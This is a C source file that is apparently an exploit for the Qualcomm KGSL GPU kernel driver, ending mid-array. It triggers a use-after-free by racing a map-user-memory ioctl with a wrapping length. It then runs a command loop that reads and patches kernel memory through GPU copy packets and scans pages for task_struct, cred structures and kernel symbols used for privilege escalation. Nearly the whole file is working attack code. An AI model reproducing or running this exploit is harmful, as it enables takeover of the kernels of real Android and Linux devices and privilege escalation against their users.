#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <errno.h>

#ifndef __user
#define __user
#endif

#include "../../msm_kgsl.h"

#define PAGE_SIZE 4096
// IMPORTANT: These flags MUST match v6.c exactly
// KGSL_CONTEXT_PREAMBLE = 0x10, KGSL_CONTEXT_NO_GMEM_ALLOC = 0x02
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CMDLIST_IB 0x00000001
#define KGSL_TIMESTAMP_RETIRED 0x00000002
#define IOCTL_KGSL_DRAWCTXT_DESTROY _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)

static inline uint32_t pm4_calc_odd_parity_bit(uint32_t val)
{
    unsigned int p = 0;
    while (val) {
        p ^= (val & 1);
        val >>= 1;
    }
    return p ^ 1;
}

static inline uint32_t cp_type7_packet(uint32_t opcode, uint32_t cnt)
{
    return (7u << 28) | ((cnt & 0x3FFFu) << 0) | (pm4_calc_odd_parity_bit(cnt) << 15) | ((opcode & 0x7Fu) << 16) | (pm4_calc_odd_parity_bit(opcode) << 23);
}

#define CP_MEM_TO_MEM 0x73

static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi)
{
    *lo = (uint32_t)addr;
    *hi = (uint32_t)(addr >> 32);
}

static int kgsl_fd = -1;
static uint32_t ctx_id = 0;
static uint64_t ib_gpu = 0, dst_gpu = 0;
static void *ib_vma = NULL, *dst_vma = NULL;
static uint32_t ib_id = 0, dst_id = 0;
// Scratch page for read_gpu_window / read_gpu_page callers that don't want
// to allocate their own buffer on the stack.
static uint8_t tmp_page[PAGE_SIZE];

void cleanup_kgsl() {
    if (ib_vma && ib_vma != MAP_FAILED) munmap(ib_vma, PAGE_SIZE * 2);
    if (dst_vma && dst_vma != MAP_FAILED) munmap(dst_vma, PAGE_SIZE);
    
    struct kgsl_gpuobj_free fr = {0};
    if (ib_id) { fr.id = ib_id; ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
    if (dst_id) { fr.id = dst_id; ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
    
    if (ctx_id) {
        struct kgsl_drawctxt_destroy dctx = { .drawctxt_id = ctx_id };
        ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &dctx);
    }
    
    if (kgsl_fd >= 0) close(kgsl_fd);
    
    ctx_id = 0;
    ib_id = dst_id = 0;
    ib_vma = dst_vma = NULL;
    kgsl_fd = -1;
}

int init_kgsl() {
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) {
        fprintf(stderr, "Error opening /dev/kgsl-3d0: %s\n", strerror(errno));
        return -1;
    }

    // Use the exact same flags and retry strategy as v6.c
    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC
    };
    int retry = 30;
    while (retry--) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) == 0) {
            ctx_id = ctx.drawctxt_id;
            break;
        }
        // Small delay between retries (like v6.c, but faster)
        usleep(50000); // 50ms
    }
    
    if (ctx_id == 0) {
        fprintf(stderr, "IOCTL_KGSL_DRAWCTXT_CREATE failed: %s (flags: 0x%x)\n", 
                strerror(errno), ctx.flags);
        return -2;
    }

    struct kgsl_gpuobj_alloc alloc = { .size = PAGE_SIZE * 2, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) != 0) {
        fprintf(stderr, "IOCTL_KGSL_GPUOBJ_ALLOC (IB) failed: %s\n", strerror(errno));
        return -3;
    }
    ib_id = alloc.id;
    ib_vma = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)ib_id << 12);
    if (ib_vma == MAP_FAILED) {
        fprintf(stderr, "mmap IB failed: %s\n", strerror(errno));
        return -3;
    }
    
    struct kgsl_gpuobj_info info = { .id = ib_id };
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;

    alloc.size = PAGE_SIZE;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) != 0) {
        fprintf(stderr, "IOCTL_KGSL_GPUOBJ_ALLOC (DST) failed: %s\n", strerror(errno));
        return -4;
    }
    dst_id = alloc.id;
    dst_vma = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)dst_id << 12);
    if (dst_vma == MAP_FAILED) {
        fprintf(stderr, "mmap DST failed: %s\n", strerror(errno));
        return -4;
    }
    info.id = dst_id;
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    dst_gpu = info.gpuaddr;

    return 0;
}

int gpu_mem_op(uint64_t src_gpu_va, uint64_t dst_gpu_va, int size) {
    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;

    uint32_t d_lo, d_hi, s_lo, s_hi;
    split64(dst_gpu_va, &d_lo, &d_hi);
    split64(src_gpu_va, &s_lo, &s_hi);

    cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
    cmd[dw++] = 0;
    cmd[dw++] = d_lo;
    cmd[dw++] = d_hi;
    cmd[dw++] = s_lo;
    cmd[dw++] = s_hi;

    struct kgsl_command_object obj = { .gpuaddr = ib_gpu, .size = dw * 4, .flags = KGSL_CMDLIST_IB, .id = ib_id };
    struct kgsl_gpu_command gpu_cmd = {
        .cmdlist = (uintptr_t)&obj, .cmdsize = sizeof(obj), .numcmds = 1,
        .context_id = ctx_id
    };

    if (ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) != 0) return -1;
    
    struct kgsl_cmdstream_readtimestamp_ctxtid rt = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int spins = 0; spins < 10000; spins++) {
        ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &rt);
        if (rt.timestamp >= gpu_cmd.timestamp) break;
        usleep(100);
    }
    return 0;
}

int read_gpu_page(uint64_t src_gpu_va, uint8_t *out_buf) {
    if (gpu_mem_op(src_gpu_va, dst_gpu, PAGE_SIZE) != 0) return -1;
    memcpy(out_buf, dst_vma, PAGE_SIZE);
    return 0;
}

// Read N consecutive pages starting at src_gpu_va into out_buf.
// Returns 0 on success, -1 on any failed page.
// Used to catch offsets that straddle page boundaries.
int read_gpu_pages(uint64_t src_gpu_va, uint8_t *out_buf, int n_pages) {
    for (int i = 0; i < n_pages; i++) {
        if (read_gpu_page(src_gpu_va + (uint64_t)i * PAGE_SIZE,
                          out_buf + (size_t)i * PAGE_SIZE) != 0) {
            return -1;
        }
    }
    return 0;
}

// Read a small window (max 256 bytes) at exactly src_gpu_va + off.
// Faster than read_gpu_page when we only care about a few bytes.
int read_gpu_window(uint64_t src_gpu_va, int off, int size, uint8_t *out) {
    if (off < 0 || size <= 0 || off + size > PAGE_SIZE) return -1;
    if (read_gpu_page(src_gpu_va, tmp_page) != 0) return -1;
    memcpy(out, tmp_page + off, size);
    return 0;
}

int write_gpu_mem(uint64_t dst_gpu_va, uint8_t *src_buf, int size) {
    memcpy(dst_vma, src_buf, size);
    return gpu_mem_op(dst_gpu, dst_gpu_va, size);
}

#include <sys/wait.h>
#include <pthread.h>

#define UAF_START 0x7001FF000ULL
#define UAF_SIZE  0x10004000ULL
#define BOGUS_START 0x700204000ULL
#define WRAP_SIZE 0xFFFFFFFFFFEFD000ULL

typedef struct {
    int fd;
    volatile int ready;
} race_state_t;

static void *bogus_racer(void *arg) {
    race_state_t *rs = (race_state_t *)arg;
    while (!rs->ready);
    struct kgsl_map_user_mem req = {
        .fd = -1, .gpuaddr = 0, .len = (size_t)WRAP_SIZE, 
        .hostptr = (unsigned long)BOGUS_START, .memtype = 2, .flags = 0x10000000ULL
    };
    ioctl(rs->fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    return NULL;
}

int trigger_uaf() {
    fprintf(stderr, "[UAF] allocating GPU object (size=0x%lx)...\n", (unsigned long)UAF_SIZE);
    fflush(stderr);
    struct kgsl_gpuobj_alloc alloc = { .size = UAF_SIZE, .flags = 0x10000000ULL };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) < 0) {
        fprintf(stderr, "[UAF] GPUOBJ_ALLOC failed: %s\n", strerror(errno));
        return -1;
    }
    uint32_t uaf_id = alloc.id;
    fprintf(stderr, "[UAF] id=%u, mmap 0x%lx...\n", uaf_id, (unsigned long)UAF_START);
    fflush(stderr);

    void *uaf_vma = mmap((void *)UAF_START, UAF_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_vma == MAP_FAILED) {
        fprintf(stderr, "[UAF] mmap failed: %s\n", strerror(errno));
        return -2;
    }
    fprintf(stderr, "[UAF] touching %lu pages (1 byte each, fast)...\n",
            (unsigned long)(UAF_SIZE / PAGE_SIZE));
    fflush(stderr);
    // Fast page-touch (1 byte per page) like v6.c — avoids 256MB memset
    for (size_t i = 0; i < UAF_SIZE; i += PAGE_SIZE) {
        ((volatile char *)uaf_vma)[i] = 1;
    }
    munmap(uaf_vma, UAF_SIZE);
    fprintf(stderr, "[UAF] unmapped, running race...\n");
    fflush(stderr);

    mmap((void *)BOGUS_START, 4096 * 3, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

    race_state_t rs = { .fd = kgsl_fd, .ready = 0 };
    pthread_t thread;
    pthread_create(&thread, NULL, bogus_racer, &rs);
    rs.ready = 1;
    usleep(200);
    pthread_join(thread, NULL);

    struct kgsl_gpuobj_free fr = { .id = uaf_id };
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    fprintf(stderr, "[UAF] complete\n");
    fflush(stderr);
    return 0;
}

int main(int argc, char **argv) {
    if (argc > 1 && strcmp(argv[1], "--test-exists") == 0) {
        return 0;
    }
    if (init_kgsl() != 0) {
        fprintf(stderr, "GPU Init failed\n");
        cleanup_kgsl();
        return 1;
    }

    setvbuf(stdout, NULL, _IONBF, 0); // Disable buffering for real-time output

    char line[256];
    while (fgets(line, sizeof(line), stdin)) {
        if (strncmp(line, "exploit", 7) == 0) {
            if (trigger_uaf() == 0) {
                printf("UAF_READY\n");
            } else {
                printf("UAF_FAILED\n");
            }
        } else if (strncmp(line, "read ", 5) == 0) {
            uint64_t addr = strtoull(line + 5, NULL, 16);
            uint8_t buf[PAGE_SIZE];
            if (read_gpu_page(addr, buf) == 0) {
                printf("DATA:%lx:%d\n", (unsigned long)addr, PAGE_SIZE);
                fwrite(buf, 1, PAGE_SIZE, stdout);
                printf("\nDATA_END\n");
            } else {
                printf("READ_FAILED\n");
            }
        } else if (strncmp(line, "readN ", 6) == 0) {
            // Read N consecutive pages (1..8) starting at addr. Returns
            // one contiguous DATA blob of N*PAGE_SIZE bytes. Catches
            // offsets/pointers that straddle a page boundary.
            uint64_t addr;
            int n;
            if (sscanf(line + 6, "%lx %d", &addr, &n) != 2 || n < 1 || n > 8) {
                printf("BAD_ARGS\n");
            } else {
                static uint8_t big[8 * 4096];
                if (read_gpu_pages(addr, big, n) == 0) {
                    printf("DATA:%lx:%d\n", (unsigned long)addr, n * PAGE_SIZE);
                    fwrite(big, 1, n * PAGE_SIZE, stdout);
                    printf("\nDATA_END\n");
                } else {
                    printf("READ_FAILED\n");
                }
            }
            fflush(stdout);
        } else if (strncmp(line, "window ", 7) == 0) {
            // Read `size` bytes at addr+off. Catches small windows
            // without paying for a full page read.
            uint64_t addr;
            int off, size;
            if (sscanf(line + 7, "%lx %d %d", &addr, &off, &size) != 3 ||
                size <= 0 || size > 256 || off < 0 || off + size > 4096) {
                printf("BAD_ARGS\n");
            } else {
                uint8_t small[256];
                if (read_gpu_window(addr, off, size, small) == 0) {
                    printf("DATA:%lx:%d\n", (unsigned long)(addr + off), size);
                    fwrite(small, 1, size, stdout);
                    printf("\nDATA_END\n");
                } else {
                    printf("READ_FAILED\n");
                }
            }
            fflush(stdout);
        } else if (strncmp(line, "follow ", 7) == 0) {
            // Read 8 bytes at addr as a 64-bit pointer, then read a
            // full page at that pointer. Returns the dereferenced page.
            // Used to walk: task_struct.cred -> struct cred -> ...
            uint64_t addr;
            if (sscanf(line + 7, "%lx", &addr) != 1) {
                printf("BAD_ARGS\n");
            } else {
                uint8_t ptr_buf[8];
                if (read_gpu_window(addr, 0, 8, ptr_buf) != 0) {
                    printf("READ_FAILED\n");
                } else {
                    uint64_t target;
                    memcpy(&target, ptr_buf, 8);
                    printf("FOLLOW:%lx\n", (unsigned long)target);
                    fflush(stdout);
                    uint8_t page[PAGE_SIZE];
                    if (read_gpu_page(target, page) == 0) {
                        printf("DATA:%lx:%d\n", (unsigned long)target, PAGE_SIZE);
                        fwrite(page, 1, PAGE_SIZE, stdout);
                        printf("\nDATA_END\n");
                    } else {
                        printf("READ_FAILED_AT:%lx\n", (unsigned long)target);
                    }
                }
            }
            fflush(stdout);
        } else if (strncmp(line, "patch ", 6) == 0) {
            uint64_t addr;
            uint32_t val;
            sscanf(line + 6, "%lx %x", &addr, &val);
            if (write_gpu_mem(addr, (uint8_t *)&val, 4) == 0) {
                printf("PATCH_SUCCESS\n");
            } else {
                printf("PATCH_FAILED\n");
            }
        } else if (strncmp(line, "scan ", 5) == 0) {
            uint64_t start, end;
            sscanf(line + 5, "%lx %lx", &start, &end);
            uint8_t buf[PAGE_SIZE];
            uint64_t total = end - start;
            uint64_t scanned = 0;
            // Diagnostic counters so the user can see how many
            // pages we actually read vs how many returned empty
            // and how many fired a signature. Helps debug "matches=0"
            // when spray doesn't show up in scan.
            int pages_read = 0, pages_failed = 0, pages_empty = 0,
                pages_nonzero = 0, pages_hit = 0;
            fprintf(stderr, "[SCAN] start=%lx end=%lx total=%lu pages\n",
                    (unsigned long)start, (unsigned long)end, (unsigned long)(total / PAGE_SIZE));
            fflush(stderr);
            // Scan with step 1 page (SCAN_PAGE_STEP=1) for max coverage.
            // SCAN_PAGE_STEP=2 was tried but missed too many task_struct
            // pages because KGSL pool pages are recycled quickly and
            // each task_struct occupies 1 page (4KB aligned). Reading
            // every page catches them reliably even when spray is
            // bursty. We accept the 2x read cost.
            for (uint64_t va = start; va < end; va += PAGE_SIZE) {
                if (read_gpu_page(va, buf) == 0) {
                    pages_read++;
                    // Quick check: is this page entirely zeros? Many
                    // KGSL pages are uninitialized, so this lets us
                    // skip the heavy signature matching for empty
                    // pages.
                    int any_nonzero = 0;
                    for (int zi = 0; zi < 256; zi++) {
                        if (((uint64_t *)buf)[zi] != 0) {
                            any_nonzero = 1; break;
                        }
                    }
                    if (!any_nonzero) { pages_empty++; continue; }
                    pages_nonzero++;
                    int found_sig = 0;
                    int found_off = -1;
                    // 1a. task_struct comm = "KETO0422" (our master spray) — 8 bytes
                    void *p = memmem(buf, PAGE_SIZE, "KETO0422", 8);
                    if (p) { found_sig = 1; found_off = (int)((uint8_t*)p - buf); }
                    // 1b. task_struct comm = "KET00422" (v6.c legacy) — note the missing 0
                    if (!found_sig) {
                        p = memmem(buf, PAGE_SIZE, "KET00422", 8);
                        if (p) { found_sig = 1; found_off = (int)((uint8_t*)p - buf); }
                    }
                    // 1c. KETO04NN — our 4-digit spray from verticalized
                    //     learning (KETO + 4 digits, total 8 bytes).
                    if (!found_sig) {
                        const char *q = (const char *)buf;
                        for (int i = 0; i <= PAGE_SIZE - 8; i++) {
                            if (q[i]   == 'K' && q[i+1] == 'E' &&
                                q[i+2] == 'T' && q[i+3] == 'O' &&
                                q[i+4] >= '0' && q[i+4] <= '9' &&
                                q[i+5] >= '0' && q[i+5] <= '9' &&
                                q[i+6] >= '0' && q[i+6] <= '9' &&
                                q[i+7] >= '0' && q[i+7] <= '9') {
                                // Lighter validation: just need at
                                // least 1 NUL in the next 8 bytes to
                                // confirm this looks like a 16-byte
                                // comm field.
                                int ok = 1;
                                int nulls = 0;
                                for (int j = 8; j < 16; j++) {
                                    if (i + j >= PAGE_SIZE) { ok = 0; break; }
                                    if (q[i + j] == 0) nulls++;
                                }
                                if (ok && nulls >= 1) {
                                    found_sig = 1;
                                    found_off = i;
                                    break;
                                }
                            }
                        }
                    }
                    // 1d. KETW{0,1,2}{NNN} - per-subworker marker.
                    if (!found_sig) {
                        const char *qw = (const char *)buf;
                        for (int i = 0; i <= PAGE_SIZE - 7; i++) {
                            if (qw[i]   == 'K' && qw[i+1] == 'E' &&
                                qw[i+2] == 'T' && qw[i+3] == 'W' &&
                                qw[i+4] >= '0' && qw[i+4] <= '2' &&
                                qw[i+5] >= '0' && qw[i+5] <= '9' &&
                                qw[i+6] >= '0' && qw[i+6] <= '9' &&
                                qw[i+7] >= '0' && qw[i+7] <= '9') {
                                int ok = 1;
                                int nulls = 0;
                                for (int j = 7; j < 16; j++) {
                                    if (i + j >= PAGE_SIZE) { ok = 0; break; }
                                    if (qw[i + j] == 0) nulls++;
                                }
                                if (ok && nulls >= 1) {
                                    found_sig = 1;
                                    found_off = i;
                                    break;
                                }
                            }
                        }
                    }
                    // 2. System app
                    if (!found_sig) {
                        p = memmem(buf, PAGE_SIZE, "com.android.", 11);
                        if (p) { found_sig = 2; found_off = (int)((uint8_t*)p - buf); }
                    }
                    // 2b. Linux kernel process comm strings (real kernel memory)
                    //     init_task.comm = "swapper/0\0\0\0\0\0\0\0" (PID 0)
                    //     PID 2 = "kthreadd\0\0\0\0\0\0\0\0\0"
                    //     PID 1 = "init\0\0\0\0\0\0\0\0\0\0\0\0\0"
                    //     workers: "kworker/0:0\0\0", "ksoftirqd/0\0\0\0", etc.
                    if (!found_sig) {
                        static const char *kernel_comms[] = {
                            "swapper/0", "swapper/1", "swapper/2", "swapper/3",
                            "kthreadd", "init", "kworker/", "migration/",
                            "ksoftirqd/", "rcu_sched", "rcu_bh", "rcu_preempt",
                            "kdevtmpfs", "oom_reaper", "writeback", "kcompactd",
                            "crypto", "watchdog/", "cpuhp/", "kblockd",
                            "systemd", "systemd-journal", "systemd-udevd",
                            "jbd2/", "ext4-rsv-con", "nfsiod", "nfsv4.1-svc",
                            "kswapd", "khvcd", "kthrotld", "irq/", "scsi_",
                            "fsnotify_mark", "xfsall", "xfs_mru_cache",
                            "xfs-buf/", "xfs-conv/", "xfs-cil/", "xfs-reclaim/",
                            "xfs-log/", "xfs-eofblocks/", "ipv6_addrconf",
                        };
                        for (size_t kc = 0; kc < sizeof(kernel_comms)/sizeof(kernel_comms[0]); kc++) {
                            int klen = (int)strlen(kernel_comms[kc]);
                            // Need a NUL terminator within next 16 bytes (comm is 16 bytes)
                            void *q = memmem(buf, PAGE_SIZE - 16, kernel_comms[kc], klen);
                            if (q) {
                                // Verify: NUL within 16 bytes AND no non-printable bytes
                                // in [klen..16) range (comm should be 16 bytes total)
                                int ok = 1;
                                for (int j = klen; j < 16; j++) {
                                    uint8_t cj = ((uint8_t*)q)[j];
                                    if (cj != 0) { ok = 0; break; }
                                }
                                if (ok) {
                                    found_sig = 10;
                                    found_off = (int)((uint8_t*)q - buf);
                                    break;
                                }
                            }
                        }
                    }
                    // 3. Kernel ELF header (kernel base)
                    if (!found_sig) {
                        p = memmem(buf, PAGE_SIZE, "\x7f" "ELF", 4);
                        if (p) { found_sig = 3; found_off = (int)((uint8_t*)p - buf); }
                    }
                    // 4. init_cred string
                    if (!found_sig) {
                        p = memmem(buf, PAGE_SIZE, "init_cred", 9);
                        if (p) { found_sig = 4; found_off = (int)((uint8_t*)p - buf); }
                    }
                    // 5. cred pointer — kernel pointer (0xffffff...) at expected task_struct offsets
                    // v6.c uses MARKER_OFF=0xfd8, so the cred pointer
                    // might be anywhere in 0x700..0x1100. We scan a
                    // wider range and look for kernel pointers with
                    // printable-ASCII comm nearby.
                    if (!found_sig) {
                        static const int comm_offs[] = {
                            0x718, 0xfd8,
                            0x100, 0x200, 0x300, 0x400, 0x500, 0x600,
                            0x700, 0x800, 0x900, 0xa00, 0xb00, 0xc00,
                            0xd00, 0xe00, 0xf00, 0x1000
                        };
                        for (int off = 0x700; off < 0x1100 && off < PAGE_SIZE - 8; off += 8) {
                            uint64_t v;
                            memcpy(&v, buf + off, 8);
                            if ((v >> 32) >= 0xffffff80 && (v >> 40) <= 0xffffffcf) {
                                if (v != 0 && v != 0xffffffffffffffffULL) {
                                    int has_comm = 0;
                                    for (size_t ci = 0; ci < sizeof(comm_offs) / sizeof(comm_offs[0]); ci++) {
                                        int comm_off = comm_offs[ci];
                                        if (comm_off + 16 > PAGE_SIZE) continue;
                                        int printable = 1;
                                        for (int k = 0; k < 16; k++) {
                                            uint8_t c = buf[comm_off + k];
                                            if (c != 0 && (c < 0x20 || c > 0x7e)) {
                                                printable = 0;
                                                break;
                                            }
                                        }
                                        if (printable && buf[comm_off] != 0) {
                                            has_comm = 1;
                                            break;
                                        }
                                    }
                                    if (has_comm) {
                                        found_sig = 6;
                                        found_off = off;
                                        break;
                                    }
                                }
                            }
                        }
                    }
                    // 7. Linux version banner — strong kernel indicator
                    if (!found_sig) {
                        p = memmem(buf, PAGE_SIZE, "Linux version", 13);
                        if (p) { found_sig = 7; found_off = (int)((uint8_t*)p - buf); }
                    }
                    // 8. Kernel text/data markers (device-agnostic)
                    if (!found_sig) {
                        static const char *markers[] = {
                            "kgsl-3d0", "slub", "cred_jar", "task_struct",
                            "kmem_cache", "modprobe_path", "core_pattern",
                            "poweroff_cmd", "selinux_enabled", "kptr_restrict",
                            "mdss_fb", "init_cred_cache", "selinux_enforcing",
                            "do_group_exit", "commit_creds", "prepare_kernel_cred",
                            "override_creds", "revert_creds", "abort_creds",
                        };
                        for (size_t m = 0; m < sizeof(markers)/sizeof(markers[0]); m++) {
                            int len = (int)strlen(markers[m]);
                            p = memmem(buf, PAGE_SIZE, markers[m], len);
                            if (p) {
                                found_sig = 8;
                                found_off = (int)((uint8_t*)p - buf);
                                break;
                            }
                        }
                    }
                    // 9. Heap pattern — init_cred-like structure: u32 usage=1..3,
                    //    then uid=gid=suid=sgid=euid=egid=0 (root).
                    //    Look for "01 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00 ..."
                    //    at the very start of the page, AND a kernel pointer
                    //    somewhere in the first 0x80 bytes (security/cred member).
                    if (!found_sig) {
                        uint32_t usage, uid, gid, suid, sgid, euid, egid;
                        memcpy(&usage, buf + 0,  4);
                        memcpy(&uid,    buf + 4,  4);
                        memcpy(&gid,    buf + 8,  4);
                        memcpy(&suid,   buf + 12, 4);
                        memcpy(&sgid,   buf + 16, 4);
                        memcpy(&euid,   buf + 20, 4);
                        memcpy(&egid,   buf + 24, 4);
                        if (usage > 0 && usage < 100 &&
                            uid == 0 && gid == 0 && suid == 0 &&
                            sgid == 0 && euid == 0 && egid == 0) {
                            // Look for a kernel pointer in the next 0x40 bytes
                            for (int i = 32; i < 128 && i + 8 <= PAGE_SIZE; i += 8) {
                                uint64_t p2;
                                memcpy(&p2, buf + i, 8);
                                if ((p2 >> 32) >= 0xffffff80 &&
                                    (p2 >> 40) <= 0xffffffcf && p2 != 0) {
                                    found_sig = 9;
                                    found_off = 0;
                                    break;
                                }
                            }
                        }
                    }
                    // 10 (was 2b). Handled above as sig 10 - real kernel comm strings.
                    // 11. Heap density — page is full of kernel pointers
                    //     (typical slab/cred/task_struct pages have many
                    //     pointer-sized kernel VAs). Count 0xffffff... pointers
                    //     in the page. >= 8 is a strong "real kernel heap page"
                    //     signal — the alternative is a sparse all-zero page.
                    if (!found_sig) {
                        int kptrs = 0;
                        int nonzero_bytes = 0;
                        for (int i = 0; i + 8 <= PAGE_SIZE; i += 8) {
                            uint64_t v;
                            memcpy(&v, buf + i, 8);
                            if ((v >> 32) >= 0xffffff80 &&
                                (v >> 40) <= 0xffffffcf && v != 0) {
                                kptrs++;
                            }
                            // Also count nonzero bytes for density check
                            for (int j = 0; j < 8; j++) {
                                if (buf[i + j] != 0) nonzero_bytes++;
                            }
                        }
                        // Real kernel data page: >= 8 kernel pointers AND >= 30% non-zero
                        if (kptrs >= 8 && nonzero_bytes >= 1228) {
                            found_sig = 11;
                            found_off = 0;
                        }
                    }
                    // 12. Sparse-but-real — page has a few kernel pointers and
                    //     moderate density (e.g. /sys/* or kallsyms entries
                    //     with strings). >= 3 kernel pointers and >= 16% non-zero.
                    if (!found_sig) {
                        int kptrs = 0;
                        int nonzero_bytes = 0;
                        for (int i = 0; i + 8 <= PAGE_SIZE; i += 8) {
                            uint64_t v;
                            memcpy(&v, buf + i, 8);
                            if ((v >> 32) >= 0xffffff80 &&
                                (v >> 40) <= 0xffffffcf && v != 0) {
                                kptrs++;
                            }
                            for (int j = 0; j < 8; j++) {
                                if (buf[i + j] != 0) nonzero_bytes++;
                            }
                        }
                        if (kptrs >= 3 && nonzero_bytes >= 600) {
                            found_sig = 12;
                            found_off = 0;
                        }
                    }
                    // 13. task_struct on Linux 5.4 — page has BOTH a
                    //     kernel pointer at one of the well-known
                    //     task_struct.stack offsets (0x30, 0x38)
                    //     AND a low-value u32 at a likely __state /
                    //     usage / pid slot. The u32 must look like a
                    //     plausible kernel state (0..16) or pid (0..0x8000).
                    if (!found_sig) {
                        for (int base = 0; base < 0x400; base += 0x100) {
                            // Check stack pointer at base+0x30
                            if (base + 0x40 > PAGE_SIZE) break;
                            uint64_t stack_ptr;
                            memcpy(&stack_ptr, buf + base + 0x30, 8);
                            int stack_ok = (stack_ptr >> 32) >= 0xffffff80
                                        && (stack_ptr >> 40) <= 0xffffffcf
                                        && stack_ptr != 0;
                            if (!stack_ok) continue;
                            // Check __state at base+0x28 (0=running, 4=stopped, etc)
                            uint32_t state_v;
                            memcpy(&state_v, buf + base + 0x28, 4);
                            int state_ok = state_v < 0x100;
                            // Check usage refcount at base+0x38
                            uint32_t usage_v;
                            memcpy(&usage_v, buf + base + 0x38, 4);
                            int usage_ok = usage_v > 0 && usage_v < 0x10000;
                            if (state_ok && usage_ok) {
                                found_sig = 13;
                                found_off = base;
                                break;
                            }
                            // Or check pid/tgid at base+0x570 (5.4 layout)
                            if (base + 0x580 <= PAGE_SIZE) {
                                uint32_t pid_v;
                                memcpy(&pid_v, buf + base + 0x570, 4);
                                if (pid_v < 0x8000) {
                                    found_sig = 13;
                                    found_off = base;
                                    break;
                                }
                            }
                        }
                    }
                    // 14. cred pointer in a task_struct — kernel pointer
                    //     at one of the well-known cred/real_cred
                    //     offsets (0x6a0, 0x768, 0x770, 0x7c0 in 5.4).
                    //     We require the pointer to look like a cred
                    //     struct (i.e. point to a plausible kmalloc
                    //     area, not kernel .text). On AArch64 cred
                    //     pointers live in the 0xffffff80..0xffffffcf
                    //     range and are typically >= 0xffffffe0_xxxx_xxxx.
                    if (!found_sig) {
                        const int cred_offs[] = {0x6a0, 0x768, 0x770, 0x7c0};
                        int found_in_loop = 0;
                        for (int oi = 0;
                             oi < (int)(sizeof(cred_offs)/sizeof(cred_offs[0]))
                             && !found_in_loop;
                             oi++) {
                            int off = cred_offs[oi];
                            if (off + 8 > PAGE_SIZE) continue;
                            uint64_t cred_ptr;
                            memcpy(&cred_ptr, buf + off, 8);
                            int ok = (cred_ptr >> 32) >= 0xffffffe0
                                  && (cred_ptr >> 40) <= 0xffffffcf
                                  && (cred_ptr & 0xFFFF) != 0;
                            if (ok) {
                                // Also check that comm-ish ASCII is
                                // somewhere in the page so we know
                                // it's a real task_struct.
                                for (int ci = 0; ci + 4 < PAGE_SIZE; ci++) {
                                    int run = 0, best = 0;
                                    for (int k = 0;
                                         k < 16 && ci + k < PAGE_SIZE;
                                         k++) {
                                        uint8_t c = buf[ci + k];
                                        if (0x20 <= c && c <= 0x7e) {
                                            run++; best = k;
                                        } else {
                                            if (run >= 4) break;
                                            run = 0;
                                        }
                                    }
                                    if (run >= 4) {
                                        found_sig = 14;
                                        found_off = off;
                                        found_in_loop = 1;
                                        break;
                                    }
                                }
                            }
                        }
                    }
                    // 15. Process state page — u32 process state at
                    //     possible offsets 0x28, 0x40, 0x68, 0x108
                    //     AND plausible pid in next 0x80 bytes. Real
                    //     processes have state in 0..16 and pid in
                    //     0..0x8000.
                    if (!found_sig) {
                        int state_hits = 0;
                        int best_off = -1;
                        for (int off = 0; off + 0x40 < PAGE_SIZE; off += 4) {
                            uint32_t s;
                            memcpy(&s, buf + off, 4);
                            if (s == 0 || s == 1 || s == 4 || s == 8 ||
                                s == 16 || s == 32 || s == 64) {
                                // Check pid in next 0x80 bytes
                                for (int k = 4; k < 0x80 && off + k + 4 < PAGE_SIZE; k += 4) {
                                    uint32_t p;
                                    memcpy(&p, buf + off + k, 4);
                                    if (p > 0 && p < 0x8000) {
                                        state_hits++;
                                        if (best_off < 0) best_off = off;
                                        break;
                                    }
                                }
                            }
                            if (state_hits >= 2) {
                                found_sig = 15;
                                found_off = best_off;
                                break;
                            }
                        }
                    }
                    // 16. Kernel globals — strings we know live
                    //     somewhere in kernel .rodata or .data.
                    //     These are stable string literals that the
                    //     v6.c engine also matches. We re-list them
                    //     so our engine has its own copy of the
                    //     pattern set.
                    if (!found_sig) {
                        static const char *kglobals[] = {
                            "selinux_enforcing",
                            "kptr_restrict",
                            "selinux_enabled",
                            "kgsl-3d0",
                            "modprobe_path",
                            "core_pattern",
                            "poweroff_cmd",
                            "init_cred",
                            "slub",
                            "cred_jar",
